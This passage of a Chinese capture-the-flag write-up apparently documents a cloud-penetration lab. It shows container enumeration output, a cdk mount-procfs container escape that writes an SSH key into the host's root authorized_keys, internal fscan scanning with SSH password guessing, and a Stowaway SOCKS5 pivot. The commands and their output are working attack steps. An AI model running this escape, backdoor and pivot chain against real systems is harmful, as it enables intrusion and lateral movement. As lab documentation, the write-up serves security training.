)[1;34m===================================[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Inside Container ........ [0m[1;33mYes[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Container Platform ...... [0m[1;33mdocker[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Container tools ......... [0m[1;31mNone[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m User .................... [0m[48;5;1mroot[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Groups .................. [0m[1;90m[1;37m[48;5;1mroot[0m[1;90m[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Sudoers ................. [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Docker Executable ....... [0m[1;90mNot Found[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Docker Sock ............. [0m[1;90mNot Found[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Docker Version .......... [0m[1;31mVersion Unknown[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m==================================[1;32m( Enumerating Container )[1;34m===================================[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Container ID ............ [0m[1;33m52b7e75c01a9[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Container Full ID ....... [0m[1;33m/[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Container Name .......... [0m[1;31mCould not get container name through reverse DNS[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Container IP ............ [0m[1;33m172.17.0.2 [0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m DNS Server(s) ........... [0m[1;33m100.100.2.136 100.100.2.138 [0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Host IP ................. [0m[1;33m172.17.0.1[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Operating System ........ [0m[1;90mGNU/Linux[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Kernel .................. [0m[1;90m5.15.0-144-generic[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Arch .................... [0m[1;90mx86_64[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m CPU ..................... [0m[1;90mIntel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Useful tools installed .. [0m[1;33mYes[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m/usr/bin/curl</span><br>/usr/bin/wget<br>/bin/hostname[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Dangerous Capabilities .. [0m[1;33mYes[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90mCurrent: = cap_chown,cap_[1;37m[48;5;1mdac_override[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,[1;37m[48;5;1mcap_mknod[0m[1;90m,cap_audit_write,cap_setfcap+ep</span><br>Bounding set <span class="hljs-operator">=</span>cap_chown<span class="hljs-punctuation">,</span>cap_[<span class="hljs-number">1</span><span class="hljs-comment">;37m[48;5;1mdac_override[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,[1;37m[48;5;1mcap_mknod[0m[1;90m,cap_audit_write,cap_setfcap[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m SSHD Service ............ [0m[1;31mUnknown (ps not installed)[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Privileged Mode ......... [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Docker API exposed ...... [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m====================================[1;32m( Enumerating Mounts )[1;34m====================================[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Docker sock mounted ....... [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Other mounts .............. [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m====================================[1;32m( Interesting Files )[1;34m=====================================[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Interesting environment variables ... [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Any common entrypoint files ......... [0m[1;33mYes[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m-rw-r--r-- 1 root root  15K Mar 13 15:45 /container-escape-check.sh</span><br>-rwxr-xr-<span class="hljs-keyword">x</span> <span class="hljs-number">1</span> root root  <span class="hljs-number">15</span>K Mar <span class="hljs-number">13</span> <span class="hljs-number">15</span>:<span class="hljs-number">48</span> /matrix/container-escape-check.sh<br>-rwxr-xr-<span class="hljs-keyword">x</span> <span class="hljs-number">1</span> root root  <span class="hljs-number">41</span>K Mar <span class="hljs-number">13</span> <span class="hljs-number">15</span>:<span class="hljs-number">48</span> /matrix/deepce.sh<br>-rwxr-xr-<span class="hljs-keyword">x</span> <span class="hljs-number">1</span> root root <span class="hljs-number">1.1</span>K Mar <span class="hljs-number">13</span> <span class="hljs-number">15</span>:<span class="hljs-number">48</span> /matrix/docker-wrapper.sh[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Interesting files in root ........... [0m[1;33mYes[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m/container-escape-check.sh</span><br>/cmd_kNi<span class="hljs-number">3</span>A<br>/cmd_s<span class="hljs-number">1</span>PfE<br>/spring-cloud-gateway<span class="hljs-number">-0.0</span>.<span class="hljs-number">1</span>-SNAPSHOT.jar[<span class="hljs-number">0</span>m<br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Passwords in common files ........... [0m[1;33mYes[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90m/cmd_kNi3A:2:echo &#x27;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGUWxR5KNO7huE7FuMOmp7X3KfHVp97IiAXLE+BbYoDb&#x27; &gt;&gt; /root/.ssh/authorized_keys</span><br>/container-escape-check.sh:<span class="hljs-number">167</span>:    find / -name passwd <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-keyword">null</span> | grep /etc/passwd | wc -l | grep -q <span class="hljs-number">7</span> &amp;&amp; IsRootDirectoryMount<span class="hljs-operator">=</span><span class="hljs-number">1</span> || IsRootDirectoryMount<span class="hljs-operator">=</span><span class="hljs-number">0</span><br>/container-escape-check.sh:<span class="hljs-number">335</span>:    if [ ! -f <span class="hljs-string">&quot;/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span> ]<span class="hljs-comment">;then[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Home directories .................... [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Hashes in shadow file ............... [0m[1;90mNo[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Searching for app dirs .............. [0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m==================================[1;32m( Enumerating Containers )[1;34m==================================[0m</span><br>[<span class="hljs-number">1</span><span class="hljs-comment">;90mBy default containers can communicate with other containers on the same network and the </span><br>host machine<span class="hljs-punctuation">,</span> this can be used <span class="hljs-keyword">to</span> enumerate further[<span class="hljs-number">0</span>m<br><br>[<span class="hljs-number">1</span><span class="hljs-comment">;33m[+][1;32m Attempting ping sweep of 172.17.0.2 /24 (ping) [0m</span><br><span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span> is Up<br><span class="hljs-number">172.17</span>.<span class="hljs-number">0.2</span> is Up<br>[<span class="hljs-number">1</span><span class="hljs-comment">;34m===============================================[1;32m[1;34m===============================================[0m</span><br></code></pre></td></tr></table></figure>
+
+<p>习惯把公私钥生成在当前目录下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa -f ./rsa_key<br><span class="hljs-built_in">cat</span> ./rsa_key.pub<br></code></pre></td></tr></table></figure>
+
+<p>写入ssh</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">./cdk_linux run mount-procfs /host/<span class="hljs-keyword">proc</span>/ &quot;mkdir /root/.ssh/&quot;<br>./cdk_linux<span class="hljs-title"> run</span> mount-procfs /host/<span class="hljs-keyword">proc</span>/ &#x27;echo<span class="hljs-title"> xxxxxxxxx</span> &gt;&gt; /root/.ssh/authorized_keys&#x27;<br>./cdk<span class="hljs-title"> run</span> mount-procfs /host/<span class="hljs-keyword">proc</span>/ &#x27;echo<span class="hljs-title"> ssh-rsa</span> AAAAB3NzaC1yc2EAAAADAQABAAACAQCpgzfhPAaF9g1Vka1mM7p1Q05K1ex7IF0REjpezkS3v8AOC351PIkvZanwDdkg/ntqI/RUQY1K6eB3iWAovES4zPDm7mUyxpxqNqv19hSuHASxdW/6ha003tI0JT3fs3ZcJQ+m1Abpg9PLyFET854LwOCNNaK3gLpKSm0kPk6U70u2N9CFik7FvZFfmTBYLusDi+eQENLo6cx17U+XG5+BUBXQCG+VKIjsBI/sjQ+SMv25CsWTfYBXabSZUSkb+oZr2mEdbNLqWO1T+wsMx7+4RpwxaS3/0/kZ0tlwBC+zmmlTCcRu24WsfvTqtdbkJ/Lh4mVZID+V3jgG7tBEm9YgJzG5PcRHU7HKCQAYJx9UZH0j/dwCRIsVHdvPU4AjIlKECwImobyWdYDyjcuA+vkVxX3/94kOKcBfVU9HCj1ZIg3INc05qbkF5RG+eYnoy96hVKhpz/MpU40t+H3jhzMdYsfBS01UQaQRI9sg0D2L7/PCvSg3WuOdLTAGiO0e3sTwflm0HHLr1TcVaamYcZyoPNfkwuwanu9sp+j/vHPNucHfiIoeL2yGYS+gzpmxK7L69wc4bKtlWBNRkRPgZoCTrRupoBQTAodpeahsMg+YhHe2AyZ2PzgRaPjt6bMcB0TJ08EdrHGfPfhJUMGQ75bBe3b5aX2e7oOsK3gzTr/2iw==<span class="hljs-title"> matrix@matrix</span> &gt;&gt; /root/.ssh/authorized_keys&#x27;<br><br>2026/03/13 09:57:07<span class="hljs-title"> env</span> GOTRACEBACK<span class="hljs-title"> not</span> found,<span class="hljs-title"> trying</span> to<span class="hljs-title"> set</span> GOTRACEBACK=crash<span class="hljs-title"> then</span> reload<span class="hljs-title"> exploit.</span><br>2026/03/13 09:57:07<span class="hljs-title"> Execute</span> Shell:./cdk<span class="hljs-title"> run</span> mount-procfs /host/<span class="hljs-keyword">proc</span>/<span class="hljs-title"> echo</span> ssh-rsa<span class="hljs-title"> AAAAB3NzaC1yc2EAAAADAQABAAACAQCpgzfhPAaF9g1Vka1mM7p1Q05K1ex7IF0REjpezkS3v8AOC351PIkvZanwDdkg/ntqI/RUQY1K6eB3iWAovES4zPDm7mUyxpxqNqv19hSuHASxdW/6ha003tI0JT3fs3ZcJQ+m1Abpg9PLyFET854LwOCNNaK3gLpKSm0kPk6U70u2N9CFik7FvZFfmTBYLusDi+eQENLo6cx17U+XG5+BUBXQCG+VKIjsBI/sjQ+SMv25CsWTfYBXabSZUSkb+oZr2mEdbNLqWO1T+wsMx7+4RpwxaS3/0/kZ0tlwBC+zmmlTCcRu24WsfvTqtdbkJ/Lh4mVZID+V3jgG7tBEm9YgJzG5PcRHU7HKCQAYJx9UZH0j/dwCRIsVHdvPU4AjIlKECwImobyWdYDyjcuA+vkVxX3/94kOKcBfVU9HCj1ZIg3INc05qbkF5RG+eYnoy96hVKhpz/MpU40t+H3jhzMdYsfBS01UQaQRI9sg0D2L7/PCvSg3WuOdLTAGiO0e3sTwflm0HHLr1TcVaamYcZyoPNfkwuwanu9sp+j/vHPNucHfiIoeL2yGYS+gzpmxK7L69wc4bKtlWBNRkRPgZoCTrRupoBQTAodpeahsMg+YhHe2AyZ2PzgRaPjt6bMcB0TJ08EdrHGfPfhJUMGQ75bBe3b5aX2e7oOsK3gzTr/2iw==</span> matrix@matrix &gt;&gt; /root/.ssh/authorized_keys<span class="hljs-title"> failed</span> with<span class="hljs-title"> error:signal:</span> aborted (core<span class="hljs-title"> dumped)</span><br>2026/03/13 09:57:07<span class="hljs-title"> if</span> you<span class="hljs-title"> see</span> &quot;(core<span class="hljs-title"> dumped)&quot;</span> in<span class="hljs-title"> former</span> err<span class="hljs-title"> output,</span> means<span class="hljs-title"> exploit</span> success.<br></code></pre></td></tr></table></figure>
+
+<p>直接ssh登录拿到flag</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> ./rsa_key root<span class="hljs-keyword">@8</span>.147.69.40<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152218401.png" srcset="/img/loading.gif" lazyload alt="image-20260313175932308"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@platform:~# cat /flag<br><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2</span>d7f940b-<span class="hljs-number">6371</span>-<span class="hljs-number">4</span>b9a-bc14-<span class="hljs-number">62</span>fa9a579cfb&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><h2 id="APK-加解密"><a href="#APK-加解密" class="headerlink" title="APK 加解密"></a>APK 加解密</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ifconfig<br>docker0: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span><br>        inet <span class="hljs-number">172</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>  netmask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>  broadcast <span class="hljs-number">172</span>.<span class="hljs-number">17</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span><br>        inet6 fe80::<span class="hljs-number">8056</span>:29ff:fe1d:<span class="hljs-number">4526</span>  prefixlen <span class="hljs-number">64</span>  scopeid 0x20&lt;link&gt;<br>        ether <span class="hljs-number">82</span>:<span class="hljs-number">56</span>:<span class="hljs-number">29</span>:1d:<span class="hljs-number">45</span>:<span class="hljs-number">26</span>  txqueuelen <span class="hljs-number">0</span>  (Ethernet)<br>        RX packets <span class="hljs-number">70450</span>  bytes <span class="hljs-number">8554768</span> (<span class="hljs-number">8</span>.<span class="hljs-number">5</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">79895</span>  bytes <span class="hljs-number">20707618</span> (<span class="hljs-number">20</span>.<span class="hljs-number">7</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>eth0: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span><br>        inet <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">12</span>  netmask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>  broadcast <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span><br>        inet6 fe80::<span class="hljs-number">216</span>:3eff:fe13:<span class="hljs-number">4188</span>  prefixlen <span class="hljs-number">64</span>  scopeid 0x20&lt;link&gt;<br>        ether <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:3e:<span class="hljs-number">13</span>:<span class="hljs-number">41</span>:<span class="hljs-number">88</span>  txqueuelen <span class="hljs-number">1000</span>  (Ethernet)<br>        RX packets <span class="hljs-number">1228268</span>  bytes <span class="hljs-number">210633268</span> (<span class="hljs-number">210</span>.<span class="hljs-number">6</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">1249256</span>  bytes <span class="hljs-number">162182608</span> (<span class="hljs-number">162</span>.<span class="hljs-number">1</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>lo: flags=<span class="hljs-number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="hljs-number">65536</span><br>        inet <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>  netmask <span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>        inet6 ::<span class="hljs-number">1</span>  prefixlen <span class="hljs-number">128</span>  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen <span class="hljs-number">1000</span>  (Local Loopback)<br>        RX packets <span class="hljs-number">15070</span>  bytes <span class="hljs-number">3504241</span> (<span class="hljs-number">3</span>.<span class="hljs-number">5</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">15070</span>  bytes <span class="hljs-number">3504241</span> (<span class="hljs-number">3</span>.<span class="hljs-number">5</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>veth456daa6: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span><br>        inet6 fe80::<span class="hljs-number">6458</span>:53ff:fee1:d222  prefixlen <span class="hljs-number">64</span>  scopeid 0x20&lt;link&gt;<br>        ether <span class="hljs-number">66</span>:<span class="hljs-number">58</span>:<span class="hljs-number">53</span>:e1:d2:<span class="hljs-number">22</span>  txqueuelen <span class="hljs-number">0</span>  (Ethernet)<br>        RX packets <span class="hljs-number">70450</span>  bytes <span class="hljs-number">9541068</span> (<span class="hljs-number">9</span>.<span class="hljs-number">5</span> MB)<br>        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        TX packets <span class="hljs-number">79912</span>  bytes <span class="hljs-number">20708904</span> (<span class="hljs-number">20</span>.<span class="hljs-number">7</span> MB)<br>        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br>./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">12</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">14</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">41</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">88</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">253</span>   is alive<br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">5</span><br><span class="hljs-number">172.16.22.41:88</span> open<br><span class="hljs-number">172.16.22.88:80</span> open<br><span class="hljs-number">172.16.22.14:80</span> open<br><span class="hljs-number">172.16.22.12:80</span> open<br><span class="hljs-number">172.16.22.88:22</span> open<br><span class="hljs-number">172.16.22.14:22</span> open<br><span class="hljs-number">172.16.22.12:22</span> open<br><span class="hljs-number">172.16.22.88:8080</span> open<br><span class="hljs-number">172.16.22.12:8080</span> open<br><span class="hljs-number">172.16.22.41:445</span> open<br><span class="hljs-number">172.16.22.41:139</span> open<br><span class="hljs-number">172.16.22.41:135</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">12</span><br>start vulscan<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">14</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">10671</span>  title:Apache2 Ubuntu Default Page: It works<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">12</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">10032</span>  title:政务服务平台 - 门户与办事大厅<br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">41</span><br>   <span class="hljs-string">[-&gt;]</span>DC<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">41</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">88</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">4531</span>   title:政务内网资源下载<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">41</span>    <span class="hljs-string">[+]</span> DC:ZWFW\DC                 <br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">88</span>:<span class="hljs-number">8080</span>  code:<span class="hljs-number">404</span> len:<span class="hljs-number">306</span>    title:None<br>已完成 <span class="hljs-number">9</span>/<span class="hljs-number">12</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">88</span>:<span class="hljs-number">22</span> root root111 ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">9</span>/<span class="hljs-number">12</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">14</span>:<span class="hljs-number">22</span> root <span class="hljs-number">1234567890</span> ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">9</span>/<span class="hljs-number">12</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">14</span>:<span class="hljs-number">22</span> root Aa123456! ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">9</span>/<span class="hljs-number">12</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">12</span>:<span class="hljs-number">22</span> admin admin@<span class="hljs-number">123</span> ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">9</span>/<span class="hljs-number">12</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">14</span>:<span class="hljs-number">22</span> admin <span class="hljs-number">666666</span> ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">9</span>/<span class="hljs-number">12</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">22</span>.<span class="hljs-number">12</span>:<span class="hljs-number">22</span> admin Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">12</span>/<span class="hljs-number">12</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: 7m7.483661903s<br><br></code></pre></td></tr></table></figure>
+
+<p>传stowaway、fscan</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">scp -i .<span class="hljs-regexp">/rsa_key /</span>home<span class="hljs-regexp">/matrix/</span>Desktop<span class="hljs-regexp">/Stowaway/</span>linux_x64_agent root@<span class="hljs-number">8.147</span>.<span class="hljs-number">69.40</span>:<span class="hljs-regexp">/matrix/</span><br>scp -i .<span class="hljs-regexp">/rsa_key /</span>home<span class="hljs-regexp">/matrix/</span>Desktop<span class="hljs-regexp">/fscan_all_version/</span>fscan root@<span class="hljs-number">8.147</span>.<span class="hljs-number">69.40</span>:<span class="hljs-regexp">/matrix/</span><br></code></pre></td></tr></table></figure>
+
+<p>连接并开启socks5</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> ./linux_x64_agent -l 54523 -s matrix &gt; agent.log &amp;<br><span class="hljs-comment"># 攻击机执行：</span><br>./linux_x64_admin -c 8.147.69.40:54523 -s matrix<br></code></pre></td></tr></table></figure>
+
+<p>下载 APK 文件：<a target="_blank" rel="noopener" href="http://172.16.22.88/downloads/zst.apk%EF%BC%8C%E7%82%B9%E5%87%BB%E2%80%9D%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E2%80%9C%E5%B0%B1%E8%A1%8C">http://172.16.22.88/downloads/zst.apk，点击”直接下载“就行</a></p>
